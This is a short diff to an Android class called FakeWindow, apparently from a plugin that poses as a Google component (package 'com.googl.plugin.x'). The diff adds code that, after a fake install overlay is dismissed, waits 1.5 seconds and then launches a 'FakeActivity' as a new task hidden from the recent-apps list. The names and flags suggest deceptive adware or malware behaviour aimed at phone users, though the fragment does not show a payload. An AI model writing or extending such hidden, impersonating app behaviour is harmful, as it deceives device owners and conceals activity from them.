@@ -1,6 +1,7 @@
 package com.xstd.plugin.Utils;
 
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
@@ -11,6 +12,7 @@ import android.util.DisplayMetrics;
 import android.view.*;
 import android.widget.ImageView;
 import android.widget.TextView;
+import com.googl.plugin.x.FakeActivity;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
@@ -100,6 +102,17 @@ public class FakeWindow {
             installView = null;
 
             AppRuntime.FAKE_WINDOW_SHOW = false;
+
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    Intent i = new Intent();
+                    i.setClass(context, FakeActivity.class);
+                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    context.startActivity(i);
+                }
+            }, 1500);
+
         } else {
             handler.post(new Runnable() {
                 @Override
